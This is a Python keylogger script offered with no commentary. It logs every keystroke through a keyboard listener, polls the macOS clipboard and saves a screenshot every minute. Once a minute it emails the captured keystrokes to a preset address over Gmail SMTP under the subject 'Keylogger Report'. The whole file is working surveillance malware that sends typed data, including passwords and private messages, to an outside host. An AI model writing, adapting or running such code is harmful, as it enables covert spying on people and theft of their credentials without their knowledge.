import pynput
import smtplib
import os
import time
import threading
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Email configuration
EMAIL_ADDRESS = 'your_email@example.com'
EMAIL_PASSWORD = 'your_password'
TO_EMAIL = 'recipient_email@example.com'

# Global variables
keystrokes = ""
clipboard_content = ""

# Function to send email
def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

# Function to capture keystrokes
def on_press(key):
    global keystrokes
    try:
        keystrokes += f"{key.char}"
    except AttributeError:
        keystrokes += f" {key} "

# Function to capture clipboard content
def capture_clipboard():
    global clipboard_content
    while True:
        clipboard_content = os.popen('pbpaste').read()  # For macOS
        time.sleep(5)  # Check every 5 seconds

# Function to take screenshots
def take_screenshot():
    while True:
        screenshot = ImageGrab.grab()
        screenshot.save(f"screenshot_{int(time.time())}.png")
        time.sleep(60)  # Take a screenshot every minute

# Function to log keystrokes
def log_keystrokes():
    global keystrokes
    while True:
        if keystrokes:
            send_email("Keylogger Report", keystrokes)
            keystrokes = ""
        time.sleep(60)  # Send logs every minute

# Start the keylogger
def start_keylogger():
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    
    threading.Thread(target=capture_clipboard).start()
    threading.Thread(target=take_screenshot).start()
    threading.Thread(target=log_keystrokes).start()
    
    listener.join()

if __name__ == "__main__":
    start_keylogger()
